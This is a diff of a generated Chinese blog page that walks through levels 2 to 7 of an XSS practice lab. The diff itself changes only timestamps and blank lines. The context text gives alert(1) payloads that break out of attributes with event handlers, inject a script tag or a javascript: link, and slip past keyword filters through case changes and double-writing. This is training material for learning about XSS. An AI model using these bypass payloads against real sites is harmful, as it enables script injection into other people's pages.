@@ -43,7 +43,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2022-10-29T13:00:37.000Z">
-<meta property="article:modified_time" content="2022-10-29T13:02:20.602Z">
+<meta property="article:modified_time" content="2022-10-29T13:08:07.058Z">
 <meta property="article:author" content="Tao">
 <meta property="article:tag" content="xss">
 <meta name="twitter:card" content="summary">
@@ -1627,7 +1627,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1667048668295),
+    lastupdate: new Date(1667048905610),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2509,17 +2509,27 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>payload:</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onfocus=alert(1) //</span></span><br><span class="line"><span class="string">&quot;</span>&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
 
+
+
 <p>第三关:和上关相比 input标签进行了过滤 无法使用双引号但是可以使用单引号闭合value</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onfocus=alert(1) //</span></span><br><span class="line"><span class="string">&#x27;</span>&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
 
 <p>第四关: input标签过滤了尖括号(&lt; &gt;)但是采用事件一样可以所以上一关的第一个payload直接使用即可</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onfocus=alert(1) //</span></span><br></pre></td></tr></table></figure>
 
+
+
 <p>第五关:  进行了匹配关键字过滤(on和script会过滤为o_n  scr_ipt) 但是尖括号 “ 都正常 尝试使用不带事件和script的payload 伪协议</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a href=javascript:alert(1)&gt;123//</span></span><br></pre></td></tr></table></figure>
 
+
+
 <p>第六关: 和上关一样也进行了关键字过滤,尝试大小写 发现并没有进行大小写转换 </p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a Href=javascript:alert(1)&gt;123//</span></span><br></pre></td></tr></table></figure>
+
+
 
 <p>第七关: 对关键字进行了过滤,大小写进行了转换,但是发现对方对关键字是替换为空,尝试进行双写绕过</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; oonnblur=alert(1)//</span></span><br></pre></td></tr></table></figure>
@@ -2576,7 +2586,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-10-29T21:02:20+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-10-29T21:08:07+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：Oct 29, 2022</p>
@@ -2725,17 +2735,27 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 payload:
 12&quot; onfocus&#x3D;alert(1) &#x2F;&#x2F;&quot;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;
 
+
+
 第三关:和上关相比 input标签进行了过滤 无法使用双引号但是可以使用单引号闭合value
 12&#39; onfocus&#x3D;alert(1) &#x2F;&#x2F;&#39;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;
+
+
 
 第四关: input标签过滤了尖括号(&lt; &gt;)但是采用事件一样可以所以上一关的第一个payload直接使用即可
 1&#39; onfocus&#x3D;alert(1) &#x2F;&#x2F;
 
+
+
 第五关:  进行了匹配关键字过滤(on和script会过滤为o_n  scr_ipt) 但是尖括号 “ 都正常 尝试使用不带事件和script的payload 伪协议
 1&quot;&gt; &lt;a href&#x3D;javascript:alert(1)&gt;123&#x2F;&#x2F;
 
+
+
 第六关: 和上关一样也进行了关键字过滤,尝试大小写 发现并没有进行大小写转换 
 1&quot;&gt; &lt;a Href&#x3D;javascript:alert(1)&gt;123&#x2F;&#x2F;
+
+
 
 第七关: 对关键字进行了过滤,大小写进行了转换,但是发现对方对关键字是替换为空,尝试进行双写绕过
 1&quot; oonnblur&#x3D;alert(1)&#x2F;&#x2F;
@@ -3450,7 +3470,7 @@ payload:
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"清海个人博客","url":"http://github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Tao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://github.io/","sameAs":["https://github.com/volantis-x"],"description":"清海个人博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://github.io/","name":"清海个人博客"}},{"@type":"ListItem","position":2,"item":{"@id":"http://github.io/categories/网络安全/","name":"网络安全"}},{"@type":"ListItem","position":3,"item":{"@id":"http://github.io/2022/10/29/XSS漏洞详解/","name":"XSS漏洞详解"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"清海个人博客","url":"http://github.io/","keywords":null,"description":"清海个人博客","author":{"@type":"Person","name":"Tao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://github.io/","description":"清海个人博客"},"publisher":{"@type":"Organization","name":"清海个人博客","url":"http://github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"XSS漏洞详解","description":"清海个人博客","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://github.io/2022/10/29/XSS%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"},"author":{"@type":"Person","name":"Tao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://github.io/"},"publisher":{"@type":"Organization","name":"清海个人博客","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://github.io/2022/10/29/XSS%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/","wordCount":0,"datePublished":"2022-10-29T13:00:37.000Z","dateModified":"2022-10-29T13:02:20.602Z","articleSection":"网络安全","keywords":"xss","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"清海个人博客","url":"http://github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Tao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://github.io/","sameAs":["https://github.com/volantis-x"],"description":"清海个人博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://github.io/","name":"清海个人博客"}},{"@type":"ListItem","position":2,"item":{"@id":"http://github.io/categories/网络安全/","name":"网络安全"}},{"@type":"ListItem","position":3,"item":{"@id":"http://github.io/2022/10/29/XSS漏洞详解/","name":"XSS漏洞详解"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"清海个人博客","url":"http://github.io/","keywords":null,"description":"清海个人博客","author":{"@type":"Person","name":"Tao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://github.io/","description":"清海个人博客"},"publisher":{"@type":"Organization","name":"清海个人博客","url":"http://github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"XSS漏洞详解","description":"清海个人博客","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://github.io/2022/10/29/XSS%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"},"author":{"@type":"Person","name":"Tao","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://github.io/"},"publisher":{"@type":"Organization","name":"清海个人博客","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://github.io/2022/10/29/XSS%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/","wordCount":0,"datePublished":"2022-10-29T13:00:37.000Z","dateModified":"2022-10-29T13:08:07.058Z","articleSection":"网络安全","keywords":"xss","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
